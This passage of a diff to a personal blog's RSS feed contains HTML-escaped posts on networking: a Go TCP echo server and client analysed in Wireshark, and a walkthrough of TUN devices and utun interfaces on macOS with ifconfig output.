+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Println&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;failed to read data, err:&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#a6e22e&#34;&gt;fmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Println&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;connection closed by client:&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;conn&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;RemoteAddr&lt;/span&gt;())
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#a6e22e&#34;&gt;fmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Printf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;request: %s&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;buf&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#a6e22e&#34;&gt;line&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Sprintf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%s&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;buf&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;// Same as on client side&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#a6e22e&#34;&gt;_&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;_&lt;/span&gt; = &lt;span style=&#34;color:#a6e22e&#34;&gt;conn&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Write&lt;/span&gt;([]byte(&lt;span style=&#34;color:#a6e22e&#34;&gt;line&lt;/span&gt;))
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Run server and client:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# server&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ go run main.go &lt;span style=&#34;color:#ae81ff&#34;&gt;9000&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# client&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ go run main.go
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Wireshark:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://blog.jiyi27.com/001-wireshark/a.png&#34; alt=&#34;a&#34;&gt;&lt;/p&gt;
+&lt;p&gt;The first three is the three-way handshake packet,&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[SYN] seq=0 len=0
+[SYN] seq=0 ack=1 len=0
+[SYN] seq=1 ack=1 len=0
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Note that the length of the fifth packet:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# ACK sent with data&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;PSH, ACK&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; ... len&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blog.jiyi27.com/001-wireshark/b.png&#34; alt=&#34;b&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;len&lt;/code&gt; is the data&amp;rsquo;s length, the first there packets are just three-way handshake there is no data sent, so &lt;code&gt;len=0&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;The last four packets are TCP termination four-way hand-shake:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# ACK sent with FIN, this ACK is used to &lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# ack=16 confirms that client has received the 15 byte sent by server &lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# and client expects seq=16 from server&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;FIN, ACK&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; seq&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt; ack&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt; len&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;ACK&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; seq&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt; ack&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
+&lt;p&gt;The TCP &lt;code&gt;ACK&lt;/code&gt; flag is used to confirm the last received byte by receiver.&lt;/p&gt;
+&lt;p&gt;The &lt;code&gt;PSH&lt;/code&gt; flag, on the other hand, is used to tell the server to push data to the application layer immediately.&lt;/p&gt;
+&lt;/blockquote&gt;
+</content>
+    </item>
+    
+    <item>
+      <title>Working with TUN Device on MacOS</title>
+      <link>https://blog.jiyi27.com/posts/networking/007-tun-device-macos/</link>
+      <pubDate>Tue, 12 Sep 2023 08:31:59 +0000</pubDate>
+      
+      <guid>https://blog.jiyi27.com/posts/networking/007-tun-device-macos/</guid>
+      <description>&lt;h2 id=&#34;1-tun-on-macos&#34;&gt;1. TUN on MacOS&lt;/h2&gt;
+&lt;p&gt;On macOS, the &lt;code&gt;utun&lt;/code&gt; interface is a type of TUN device specifically designed for VPN connections to handle the network traffic &lt;strong&gt;within the VPN tunnel&lt;/strong&gt; &lt;a href=&#34;https://apple.stackexchange.com/questions/310220/who-creates-utun0-adapter&#34;&gt;regardless of whether VPN is enabled&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;I&amp;rsquo;ll give you an example to demonstrate the realtionship between TUN device and utun interface, the code below written in Go is to create a TUN device:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// New() creates a new TUN/TAP interface using config.&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;ifce&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;water&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;New&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;water&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Config&lt;/span&gt;{&lt;span style=&#34;color:#a6e22e&#34;&gt;DeviceType&lt;/span&gt;: &lt;span style=&#34;color:#a6e22e&#34;&gt;water&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;TUN&lt;/span&gt;})
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Before run this code there are 4 utun interfaces on my mac:&lt;/p&gt;</description>
+      <content>&lt;h2 id=&#34;1-tun-on-macos&#34;&gt;1. TUN on MacOS&lt;/h2&gt;
+&lt;p&gt;On macOS, the &lt;code&gt;utun&lt;/code&gt; interface is a type of TUN device specifically designed for VPN connections to handle the network traffic &lt;strong&gt;within the VPN tunnel&lt;/strong&gt; &lt;a href=&#34;https://apple.stackexchange.com/questions/310220/who-creates-utun0-adapter&#34;&gt;regardless of whether VPN is enabled&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;I&amp;rsquo;ll give you an example to demonstrate the realtionship between TUN device and utun interface, the code below written in Go is to create a TUN device:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// New() creates a new TUN/TAP interface using config.&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;ifce&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;water&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;New&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;water&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Config&lt;/span&gt;{&lt;span style=&#34;color:#a6e22e&#34;&gt;DeviceType&lt;/span&gt;: &lt;span style=&#34;color:#a6e22e&#34;&gt;water&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;TUN&lt;/span&gt;})
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Before run this code there are 4 utun interfaces on my mac:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ ifconfig
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;utun0: flags&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;8051&amp;lt;UP,POINTOPOINT,RUNNING,MULTICAST&amp;gt; mtu &lt;span style=&#34;color:#ae81ff&#34;&gt;1380&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	inet6 fe80::652e:88dd:ddb0:ad93%utun0 prefixlen &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt; scopeid 0xf 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	nd6 options&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;201&amp;lt;PERFORMNUD,DAD&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;...
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;utun4: flags&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;8051&amp;lt;UP,POINTOPOINT,RUNNING,MULTICAST&amp;gt; mtu &lt;span style=&#34;color:#ae81ff&#34;&gt;1380&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	inet6 fe80::e305:5ba8:574a:a5ac%utun4 prefixlen &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt; scopeid 0x13 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	nd6 options&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;201&amp;lt;PERFORMNUD,DAD&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;After I run the Go codes above with &lt;code&gt;sudo&lt;/code&gt;, there are 5 utun interfaces but with no ip information:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ ifconfig
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;...
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;utun4: flags&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;8051&amp;lt;UP,POINTOPOINT,RUNNING,MULTICAST&amp;gt; mtu &lt;span style=&#34;color:#ae81ff&#34;&gt;1380&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	inet6 fe80::e305:5ba8:574a:a5ac%utun4 prefixlen &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt; scopeid 0x13 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	nd6 options&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;201&amp;lt;PERFORMNUD,DAD&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;utun5: flags&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;8051&amp;lt;UP,POINTOPOINT,RUNNING,MULTICAST&amp;gt; mtu &lt;span style=&#34;color:#ae81ff&#34;&gt;1500&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;utun*&lt;/code&gt; is a &lt;strong&gt;point-to-point&lt;/strong&gt; interface, also called a tunnel or a peer-to-peer interface, It doesn&amp;rsquo;t behave like &amp;ldquo;shared medium&amp;rdquo; interfaces such as Wi-Fi or Ethernet, which connect you to multiple devices. Instead, it behaves like a cable that just has hosts on both ends.&lt;/p&gt;
+&lt;p&gt;There are no layer-2 headers, no MAC addresses, and no ARP on a point-to-point interface, because everything sent through it reaches the same destination (the &amp;ldquo;peer&amp;rdquo; host).&lt;/p&gt;
+&lt;p&gt;Source: &lt;a href=&#34;https://superuser.com/a/1446061/1689666&#34;&gt;https://superuser.com/a/1446061/1689666&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;2-utun-is-an-instance-of-tun-device&#34;&gt;2. &lt;code&gt;utun&lt;/code&gt; is an instance of TUN device&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;You can think &lt;code&gt;utun*&lt;/code&gt; is an instance of TUN device on Mac, a TUN device can have many instances.&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;OS treat virtual network interface (tun/tap devices) as same to the physical network interface, which means virtual network interface can have anything (including ip address) that physical network interface have.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;utun*&lt;/code&gt; is just a network interface similar to &lt;code&gt;en0&lt;/code&gt;, &lt;code&gt;lo0&lt;/code&gt;, when you input &lt;code&gt;ifconfig&lt;/code&gt; command, they will listed together:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ ifconfig     
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;lo0: flags&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;8049&amp;lt;UP,LOOPBACK,RUNNING,MULTICAST&amp;gt; mtu &lt;span style=&#34;color:#ae81ff&#34;&gt;16384&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	options&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;1203&amp;lt;RXCSUM,TXCSUM,TXSTATUS,SW_TIMESTAMP&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	inet 127.0.0.1 netmask 0xff000000 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	inet6 ::1 prefixlen &lt;span style=&#34;color:#ae81ff&#34;&gt;128&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	inet6 fe80::1%lo0 prefixlen &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt; scopeid 0x1 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	nd6 options&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;201&amp;lt;PERFORMNUD,DAD&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;en0: flags&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;8863&amp;lt;UP,BROADCAST,SMART,RUNNING,SIMPLEX,MULTICAST&amp;gt; mtu &lt;span style=&#34;color:#ae81ff&#34;&gt;1500&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	options&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;6463&amp;lt;RXCSUM,TXCSUM,TSO4,TSO6,CHANNEL_IO,PARTIAL_CSUM,ZEROINVERT_CSUM&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	ether d4:57:63:da:b6:98 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	inet6 fe80::475:ca98:8ecc:d86%en0 prefixlen &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt; secured scopeid 0xc 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	inet 192.168.2.15 netmask 0xffffff00 broadcast 192.168.2.255
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	inet6 fdd0:ed77:f347:4d69:859:d993:f358:5af9 prefixlen &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt; autoconf secured 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	nd6 options&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;201&amp;lt;PERFORMNUD,DAD&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	media: autoselect
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	status: active
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;en1: flags&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;8963&amp;lt;UP,BROADCAST,SMART,RUNNING,PROMISC,SIMPLEX,MULTICAST&amp;gt; mtu &lt;span style=&#34;color:#ae81ff&#34;&gt;1500&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	options&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;460&amp;lt;TSO4,TSO6,CHANNEL_IO&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	ether 36:6b:75:95:04:c0 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	media: autoselect &amp;lt;full-duplex&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	status: inactive
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;utun0: flags&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;8051&amp;lt;UP,POINTOPOINT,RUNNING,MULTICAST&amp;gt; mtu &lt;span style=&#34;color:#ae81ff&#34;&gt;1380&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	inet6 fe80::652e:88dd:ddb0:ad93%utun0 prefixlen &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt; scopeid 0xf 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	nd6 options&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;201&amp;lt;PERFORMNUD,DAD&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;utun1: flags&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;8051&amp;lt;UP,POINTOPOINT,RUNNING,MULTICAST&amp;gt; mtu &lt;span style=&#34;color:#ae81ff&#34;&gt;2000&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	inet6 fe80::a13f:9a63:f8cb:4017%utun1 prefixlen &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt; scopeid 0x10 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	nd6 options&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;201&amp;lt;PERFORMNUD,DAD&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;...
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Find more about what these interface are: &lt;a href=&#34;https://stackoverflow.com/a/55232331/16317008&#34;&gt;https://stackoverflow.com/a/55232331/16317008&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;e.g.,&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;utun3: flags&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;8051&amp;lt;UP,POINTOPOINT,RUNNING,MULTICAST&amp;gt; mtu &lt;span style=&#34;color:#ae81ff&#34;&gt;1500&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        inet 10.8.0.18 --&amp;gt; 10.8.0.17 netmask 0xffffffff
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;With &amp;ldquo;normal&amp;rdquo; interfaces, configuring an address with subnet mask like &lt;code&gt;192.168.1.3/24&lt;/code&gt; on eth0 is really just shorthand for saying &amp;ldquo;My address is &lt;code&gt;192.168.1.3&lt;/code&gt; and I also have an on-link route &lt;code&gt;192.168.1.0/24 dev eth0&lt;/code&gt;&amp;rdquo;. The on-link route is derived from combining the address &amp;amp; subnet mask.&lt;/p&gt;
+&lt;p&gt;With point-to-point interfaces, it&amp;rsquo;s actually the same idea. This example means &amp;ldquo;My address is &lt;code&gt;10.8.0.18&lt;/code&gt; and I also have an on-link route &lt;code&gt;10.8.0.17/32 dev utun3&lt;/code&gt;.&amp;rdquo; In this case the autogenerated route is a /32, indicating only one host – the &amp;ldquo;peer&amp;rdquo;.&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;(Note: My examples use Linux iproute2-style syntax.)&lt;/em&gt; So in the end, the difference between &lt;code&gt;10.8.0.17 netmask 0xffffffff&lt;/code&gt; and &lt;code&gt;10.8.0.17/32&lt;/code&gt; styles is just that automatic route.&lt;/p&gt;
+&lt;p&gt;Source: &lt;a href=&#34;https://superuser.com/a/1446061/1689666&#34;&gt;https://superuser.com/a/1446061/1689666&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;3-set-up-ip-for-utun-interface&#34;&gt;3. Set up ip for &lt;code&gt;utun&lt;/code&gt; interface&lt;/h2&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ tldr ifconfig
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;- View network settings of an Ethernet adapter:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    ifconfig eth0
